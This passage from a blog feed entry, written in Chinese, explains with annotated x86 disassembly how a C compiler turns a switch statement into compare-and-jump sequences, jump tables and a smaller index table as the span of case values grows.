class="number">-4</span>],<span class="number">0</span>Ah</span><br><span class="line"><span class="number">9</span>:        <span class="keyword">switch</span>(a)</span><br><span class="line"><span class="number">10</span>:       &#123;</span><br><span class="line"><span class="number">0040102F</span>   mov         eax,dword ptr [ebp<span class="number">-4</span>]</span><br><span class="line"><span class="number">00401032</span>   mov         dword ptr [ebp<span class="number">-8</span>],eax</span><br><span class="line"><span class="number">00401035</span>   cmp         dword ptr [ebp<span class="number">-8</span>],<span class="number">0</span></span><br><span class="line"><span class="number">00401039</span>   je          main+<span class="number">39</span>h (<span class="number">00401049</span>)</span><br><span class="line"><span class="number">0040103B</span>   cmp         dword ptr [ebp<span class="number">-8</span>],<span class="number">1</span></span><br><span class="line"><span class="number">0040103F</span>   je          main+<span class="number">48</span>h (<span class="number">00401058</span>)</span><br><span class="line"><span class="number">00401041</span>   cmp         dword ptr [ebp<span class="number">-8</span>],<span class="number">2</span></span><br><span class="line"><span class="number">00401045</span>   je          main+<span class="number">57</span>h (<span class="number">00401067</span>)</span><br><span class="line"><span class="number">00401047</span>   jmp         main+<span class="number">66</span>h (<span class="number">00401076</span>)</span><br><span class="line"><span class="number">11</span>:           <span class="keyword">case</span> <span class="number">0</span>: <span class="built_in">printf</span>(<span class="string">&quot;hello\n&quot;</span>); <span class="keyword">break</span>;</span><br><span class="line"><span class="number">00401049</span>   push        offset <span class="built_in">string</span> <span class="string">&quot;hello\n&quot;</span> (<span class="number">00420024</span>)</span><br><span class="line"><span class="number">0040104</span><span class="function">E   call        <span class="title">printf</span> <span class="params">(<span class="number">004010e0</span>)</span></span></span><br><span class="line">00401053   add         esp,4</span><br><span class="line"><span class="number">00401056</span>   jmp         main+<span class="number">73</span>h (<span class="number">00401083</span>)</span><br><span class="line"><span class="number">12</span>:           <span class="keyword">case</span> <span class="number">1</span>: <span class="built_in">printf</span>(<span class="string">&quot;hello\n&quot;</span>); <span class="keyword">break</span>;</span><br><span class="line"><span class="number">00401058</span>   push        offset <span class="built_in">string</span> <span class="string">&quot;hello\n&quot;</span> (<span class="number">00420024</span>)</span><br><span class="line"><span class="number">0040105</span><span class="function">D   call        <span class="title">printf</span> <span class="params">(<span class="number">004010e0</span>)</span></span></span><br><span class="line">00401062   add         esp,4</span><br><span class="line"><span class="number">00401065</span>   jmp         main+<span class="number">73</span>h (<span class="number">00401083</span>)</span><br><span class="line"><span class="number">13</span>:           <span class="keyword">case</span> <span class="number">2</span>: <span class="built_in">printf</span>(<span class="string">&quot;hello\n&quot;</span>); <span class="keyword">break</span>;</span><br><span class="line"><span class="number">00401067</span>   push        offset <span class="built_in">string</span> <span class="string">&quot;hello\n&quot;</span> (<span class="number">00420024</span>)</span><br><span class="line"><span class="number">0040106</span><span class="function">C   call        <span class="title">printf</span> <span class="params">(<span class="number">004010e0</span>)</span></span></span><br><span class="line">00401071   add         esp,4</span><br><span class="line"><span class="number">00401074</span>   jmp         main+<span class="number">73</span>h (<span class="number">00401083</span>)</span><br><span class="line"><span class="number">14</span>:           <span class="keyword">default</span>:</span><br><span class="line"><span class="number">15</span>:               <span class="built_in">printf</span>(<span class="string">&quot;end\n&quot;</span>);</span><br><span class="line"><span class="number">00401076</span>   push        offset <span class="built_in">string</span> <span class="string">&quot;end\n&quot;</span> (<span class="number">0042001</span>c)</span><br><span class="line"><span class="number">0040107B</span>   <span class="function">call        <span class="title">printf</span> <span class="params">(<span class="number">004010e0</span>)</span></span></span><br><span class="line">00401080   add         esp,4</span><br><span class="line"><span class="number">16</span>:           <span class="keyword">break</span>;</span><br><span class="line"><span class="number">17</span>:       &#125;</span><br></pre></td></tr></table></figure><p>看到这有人可能会说：欸，这也不是比较比较然后跳转吗，不和if一个套路吗？<br>不过当分支一多比如：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">8</span>:        <span class="keyword">int</span> a = <span class="number">10</span>;</span><br><span class="line"><span class="number">00401028</span>   mov         dword ptr [ebp<span class="number">-4</span>],<span class="number">0</span>Ah</span><br><span class="line"><span class="number">9</span>:        <span class="keyword">switch</span>(a)</span><br><span class="line"><span class="number">10</span>:       &#123;</span><br><span class="line"><span class="number">0040102F</span>   mov         eax,dword ptr [ebp<span class="number">-4</span>]</span><br><span class="line"><span class="number">00401032</span>   mov         dword ptr [ebp<span class="number">-8</span>],eax</span><br><span class="line"><span class="number">00401035</span>   cmp         dword ptr [ebp<span class="number">-8</span>],<span class="number">4</span></span><br><span class="line"><span class="number">00401039</span>   ja          $L540+<span class="number">0F</span>h (<span class="number">00401090</span>)</span><br><span class="line"><span class="number">0040103B</span>   mov         ecx,dword ptr [ebp<span class="number">-8</span>]</span><br><span class="line"><span class="number">0040103</span>E   jmp         dword ptr [ecx*<span class="number">4</span>+<span class="number">4010B</span>0h]</span><br><span class="line"><span class="number">11</span>:           <span class="keyword">case</span> <span class="number">0</span>: <span class="built_in">printf</span>(<span class="string">&quot;hello\n&quot;</span>); <span class="keyword">break</span>;</span><br><span class="line"><span class="number">00401045</span>   push        offset <span class="built_in">string</span> <span class="string">&quot;hello\n&quot;</span> (<span class="number">00420024</span>)</span><br><span class="line"><span class="number">0040104</span><span class="function">A   call        <span class="title">printf</span> <span class="params">(<span class="number">00401120</span>)</span></span></span><br><span class="line">0040104F   add         esp,4</span><br><span class="line"><span class="number">00401052</span>   jmp         $L540+<span class="number">1</span>Ch (<span class="number">0040109</span>d)</span><br><span class="line"><span class="number">12</span>:           <span class="keyword">case</span> <span class="number">1</span>: <span class="built_in">printf</span>(<span class="string">&quot;hello\n&quot;</span>); <span class="keyword">break</span>;</span><br><span class="line"><span class="number">00401054</span>   push        offset <span class="built_in">string</span> <span class="string">&quot;hello\n&quot;</span> (<span class="number">00420024</span>)</span><br><span class="line"><span class="number">00401059</span>   <span class="function">call        <span class="title">printf</span> <span class="params">(<span class="number">00401120</span>)</span></span></span><br><span class="line">0040105E   add         esp,4</span><br><span class="line"><span class="number">00401061</span>   jmp         $L540+<span class="number">1</span>Ch (<span class="number">0040109</span>d)</span><br><span class="line"><span class="number">13</span>:           <span class="keyword">case</span> <span class="number">2</span>: <span class="built_in">printf</span>(<span class="string">&quot;hello\n&quot;</span>); <span class="keyword">break</span>;</span><br><span class="line"><span class="number">00401063</span>   push        offset <span class="built_in">string</span> <span class="string">&quot;hello\n&quot;</span> (<span class="number">00420024</span>)</span><br><span class="line"><span class="number">00401068</span>   <span class="function">call        <span class="title">printf</span> <span class="params">(<span class="number">00401120</span>)</span></span></span><br><span class="line">0040106D   add         esp,4</span><br><span class="line"><span class="number">00401070</span>   jmp         $L540+<span class="number">1</span>Ch (<span class="number">0040109</span>d)</span><br><span class="line"><span class="number">14</span>:           <span class="keyword">case</span> <span class="number">3</span>: <span class="built_in">printf</span>(<span class="string">&quot;hello\n&quot;</span>); <span class="keyword">break</span>;</span><br><span class="line"><span class="number">00401072</span>   push        offset <span class="built_in">string</span> <span class="string">&quot;hello\n&quot;</span> (<span class="number">00420024</span>)</span><br><span class="line"><span class="number">00401077</span>   <span class="function">call        <span class="title">printf</span> <span class="params">(<span class="number">00401120</span>)</span></span></span><br><span class="line">0040107C   add         esp,4</span><br><span class="line"><span class="number">0040107F</span>   jmp         $L540+<span class="number">1</span>Ch (<span class="number">0040109</span>d)</span><br><span class="line"><span class="number">15</span>:           <span class="keyword">case</span> <span class="number">4</span>: <span class="built_in">printf</span>(<span class="string">&quot;hello\n&quot;</span>); <span class="keyword">break</span>;</span><br><span class="line"><span class="number">00401081</span>   push        offset <span class="built_in">string</span> <span class="string">&quot;hello\n&quot;</span> (<span class="number">00420024</span>)</span><br><span class="line"><span class="number">00401086</span>   <span class="function">call        <span class="title">printf</span> <span class="params">(<span class="number">00401120</span>)</span></span></span><br><span class="line">0040108B   add         esp,4</span><br><span class="line"><span class="number">0040108</span>E   jmp         $L540+<span class="number">1</span>Ch (<span class="number">0040109</span>d)</span><br><span class="line"><span class="number">16</span>:           <span class="keyword">default</span>:</span><br><span class="line"><span class="number">17</span>:               <span class="built_in">printf</span>(<span class="string">&quot;end\n&quot;</span>);</span><br><span class="line"><span class="number">00401090</span>   push        offset <span class="built_in">string</span> <span class="string">&quot;end\n&quot;</span> (<span class="number">0042001</span>c)</span><br><span class="line"><span class="number">00401095</span>   <span class="function">call        <span class="title">printf</span> <span class="params">(<span class="number">00401120</span>)</span></span></span><br><span class="line">0040109A   add         esp,4</span><br><span class="line"><span class="number">18</span>:           <span class="keyword">break</span>;</span><br><span class="line"><span class="number">19</span>:       &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>我们会发现很独特的一行<br><code>0040103E   jmp         dword ptr [ecx*4+4010B0h]</code><br>这是一个计算跳转地址的公式<br>当我们查看<code>4010B0h</code>这个地址时是如下内容</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">004010B0  45 10 40 00  </span><br><span class="line">004010B4  54 10 40 00 </span><br><span class="line">004010B8  63 10 40 00 </span><br><span class="line">004010BC  72 10 40 00 </span><br><span class="line">004010C0  81 10 40 00</span><br></pre></td></tr></table></figure><p>就会发现这是每个case的地址</p><p>将条件分支的跨度再次调大时我们把上面的<code>case 4 :</code> 调整为 <code>case 20 :</code>会发现这样的一个地址映射表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">0040B890  00 01 02 03  </span><br><span class="line">0040B894  05 05 05 05  </span><br><span class="line">0040B898  05 05 05 05  </span><br><span class="line">0040B89C  05 05 05 05  </span><br><span class="line">0040B8A0  05 05 05 05  </span><br><span class="line">0040B8A4  04 CC CC CC  </span><br></pre></td></tr></table></figure><p>姑且叫做小表，每个值都代表着对应地址映射表的位置</p><p>再将尺度调大，对于特别大的会进行判断，对于跨度小的还是公式计算，<br>当每一个跨度都特别大而且不连续那就又回到if的判断方式</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;效率似乎是个或远或近的词，对于许多人来说，在如此快速的今天，似乎不太重视那肉眼不可分的损耗。每个人都有自己的”傲慢与偏见”，而就在这里让我们回过头来看一看某些被我们忽略的一些小细节。&lt;/p&gt;
&lt;p&gt;流程对于我们日常生活来说并不陌生，或许一条道走到黑的日子并不是丰富多彩。这时条件分支便给我们提供了更加灵活的可能。&lt;/p&gt;</summary>
    
    
    
    
    <category term="c" scheme="http://0w0.host/tags/c/"/>
    
  </entry>
  
</feed>
